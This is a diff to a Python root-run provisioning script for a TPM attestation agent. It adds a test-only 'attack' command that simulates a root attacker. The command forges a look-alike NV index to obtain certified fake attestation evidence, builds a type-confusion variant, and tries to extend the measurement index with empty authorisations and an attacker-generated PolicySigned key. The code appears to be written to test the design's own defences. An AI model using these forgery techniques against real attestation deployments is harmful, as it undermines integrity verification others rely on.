@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """Provisioning, privileged half (root via sudo). See rp5-provision."""
-import json, os, re, sys, tempfile
+import json, os, re, subprocess, sys, tempfile
 sys.path.insert(0, "/usr/lib")
 from rp5agent import *  # noqa
 
@@ -177,9 +177,112 @@ def verify(args):
     return {"record": rec, "mismatch": mism, "match": not mism}
 
 
+# --------------------------------------------------------------------------------------------
+# TEST ONLY (branch test/attack-verb, never in a committed release). Stands in for an attacker
+# with root on the running system and NO secret (no owner auth, firmware key locked).
+FAKE_INDEX = "0x01800010"
+
+
+def attempt(label, *cmd):
+    r = subprocess.run(cmd, capture_output=True)
+    return {"attempt": label, "rc": r.returncode,
+            "out": (r.stdout + r.stderr).decode(errors="replace").strip()[-400:]}
+
+
+def pcr_composite():
+    import hashlib
+    return hashlib.sha256(b"".join(bytes.fromhex(pcr(i)) for i in (0, 1, 8, 9))).digest()
+
+
+def fake_index(d, content):
+    """Define an unprotected index in the platform hierarchy (root, no secret) holding content."""
+    run("tpm2_nvundefine", FAKE_INDEX, "-C", "p", check=False)
+    run("tpm2_nvdefine", FAKE_INDEX, "-C", "p", "-s", "32",
+        "-a", "ppwrite|ppread|authread|authwrite|platformcreate|no_da")
+    open(f"{d}/content.bin", "wb").write(content)
+    run("tpm2_nvwrite", FAKE_INDEX, "-C", "p", "-i", f"{d}/content.bin")
+
+
+def certify(d, index, nonce, tag):
+    run("tpm2_nvcertify", "-C", AK_HANDLE, "-c", "p", "-g", "sha256", "-s", "rsassa",
+        "-f", "plain", "-q", nonce, "--size", "32", "-o", f"{d}/{tag}.sig",
+        "--attestation", f"{d}/{tag}.msg", index)
+
+
+def attack(args):
+    import base64
+    tpm_env()
+    req = json.loads(sys.stdin.read() or "{}")
+    mode, nonce = req.get("mode"), req.get("nonce", "")
+    out = {"mode": mode, "partition": fw_partition(), "tryboot": fw_tryboot(), "counter": counter()}
+    with tempfile.TemporaryDirectory() as d:
+        if mode in ("forge-nv", "type-confusion"):
+            if not re.fullmatch(r"[0-9a-f]{64}", nonce):
+                raise Fail("nonce must be 32 bytes as hex")
+            if mode == "forge-nv":      # copy the genuine (publicly readable) content into a look-alike
+                content = run("tpm2_nvread", MEAS_INDEX, "-C", "p", "-s", "32")
+            else:                       # the public expected PCR composite
+                content = pcr_composite()
+            fake_index(d, content)
+            try:
+                run("tpm2_quote", "-c", AK_HANDLE, "-l", "sha256:0,1,8,9", "-q", nonce,
+                    "-m", f"{d}/q.msg", "-s", f"{d}/q.sig", "-o", f"{d}/pcrs.bin")
+                certify(d, FAKE_INDEX, nonce, "fake")
+                certify(d, MEAS_INDEX, nonce, "real")
+                out["fake_index_name"] = nv_name(FAKE_INDEX)
+            finally:
+                run("tpm2_nvundefine", FAKE_INDEX, "-C", "p", check=False)
+            pick = ({"quote": "q", "meas_cert": "fake"} if mode == "forge-nv"
+                    else {"quote": "fake", "meas_cert": "real"})
+            B = lambda t, e: base64.b64encode(open(f"{d}/{t}.{e}", "rb").read()).decode()
+            out["evidence"] = {"quote.msg": B(pick["quote"], "msg"), "quote.sig": B(pick["quote"], "sig"),
+                               "meas_cert.msg": B(pick["meas_cert"], "msg"),
+                               "meas_cert.sig": B(pick["meas_cert"], "sig")}
+            return out
+        if mode == "write-index":
+            res = []
+            open(f"{d}/data.bin", "wb").write(b"\xa5" * 32)
+            before = run("tpm2_nvread", MEAS_INDEX, "-C", "p", "-s", "32").hex()
+            res.append(attempt("status of the firmware key", FWC, "get-key-status", "1"))
+            res.append(attempt("extend, platform hierarchy (root, empty platform auth)",
+                               "tpm2_nvextend", MEAS_INDEX, "-C", "p", "-i", f"{d}/data.bin"))
+            res.append(attempt("extend, index authorisation (empty password)",
+                               "tpm2_nvextend", MEAS_INDEX, "-C", MEAS_INDEX, "-i", f"{d}/data.bin"))
+            res.append(attempt("extend, owner hierarchy (empty password)",
+                               "tpm2_nvextend", MEAS_INDEX, "-C", "o", "-i", f"{d}/data.bin"))
+            # PolicySigned with a key the attacker generates: valid signature, wrong key
+            run("openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", f"{d}/k.pem")
+            run("openssl", "ec", "-in", f"{d}/k.pem", "-pubout", "-out", f"{d}/kp.pem")
+            run("tpm2_loadexternal", "-C", "n", "-G", "ecc", "-a", "sign|userwithauth",
+                "-u", f"{d}/kp.pem", "-c", f"{d}/k.ctx")
+            open(f"{d}/ref", "w").write(REF_MEAS)
+            run("tpm2_nvextend", MEAS_INDEX, "-C", MEAS_INDEX, "-i", f"{d}/data.bin", "--cphash", f"{d}/cp.bin")
+            run("tpm2_startauthsession", "--policy-session", "-S", f"{d}/s.ctx")
+            run("tpm2_policysigned", "-S", f"{d}/s.ctx", "-c", f"{d}/k.ctx", "-x", "--cphash-input", f"{d}/cp.bin",
+                "-q", f"{d}/ref", "--raw-data", f"{d}/tbs.bin")
+            run("openssl", "dgst", "-sha256", "-sign", f"{d}/k.pem", "-out", f"{d}/sig.der", f"{d}/tbs.bin")
+            res.append(attempt("PolicySigned with the attacker's own key (signature valid)",
+                               "tpm2_policysigned", "-S", f"{d}/s.ctx", "-g", "sha256", "-s", f"{d}/sig.der",
+                               "-f", "ecdsa", "-c", f"{d}/k.ctx", "-x", "--cphash-input", f"{d}/cp.bin",
+                               "-q", f"{d}/ref"))
+            res.append(attempt("extend with that policy session",
+                               "tpm2_nvextend", MEAS_INDEX, "-C", MEAS_INDEX, "-i", f"{d}/data.bin",
+                               "-P", f"session:{d}/s.ctx"))
+            run("tpm2_flushcontext", f"{d}/s.ctx", check=False)
+            res.append(attempt("firmware signature over a TPM challenge (key locked after boot)",
+                               FWC, "sign", "--in", f"{d}/tbs.bin", "--key-id", "1", "--alg", "ec",
+                               "--out", f"{d}/fwsig.der"))
+            res.append(attempt("firmware public key (still readable)", FWC, "pubkey", "--key-id", "1",
+                               "--outform", "hex"))
+            after = run("tpm2_nvread", MEAS_INDEX, "-C", "p", "-s", "32").hex()
+            out.update(attempts=res, index_before=before, index_after=after, index_unchanged=before == after)
+            return out
+        raise Fail("mode must be forge-nv, type-confusion or write-index")
+
+
 if __name__ == "__main__":
     if os.geteuid() != 0:
         reply(ok=False, error="must run as root (via sudo)"); sys.exit(1)
     os.environ.pop("SSH_ORIGINAL_COMMAND", None)
     sys.exit(main({"provision": provision, "provision-fwkey": provision_fwkey,
-                  "enroll": lambda a: record(), "verify": verify}))
+                  "enroll": lambda a: record(), "verify": verify, "attack": attack}))
